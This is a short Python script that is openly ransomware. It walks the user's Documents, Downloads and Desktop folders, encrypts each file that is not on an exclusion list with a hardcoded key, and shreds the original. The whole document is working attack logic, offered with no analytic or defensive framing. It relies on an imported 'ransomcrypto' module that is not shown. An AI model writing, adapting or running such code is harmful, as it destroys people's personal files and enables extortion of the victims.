import requests, os

encryption_key = "Passw0rd!"

from ransomcrypto import *
excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
priority_dirs = ['Documents', 'Downloads', 'Desktop']

for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName

        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)

            name, ext = os.path.splitext(file_name_loc)

            if ext not in excluded_filetypes:
                print file_name_loc

                # create new encrypted file with .enc extension
                try:
                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".enc", 'wb+') as out_file:
                        encrypt(in_file, out_file, encryption_key)
                except:
                    continue

                # shred the orginial file
                shred(file_name_loc, 2)

                # onto the next
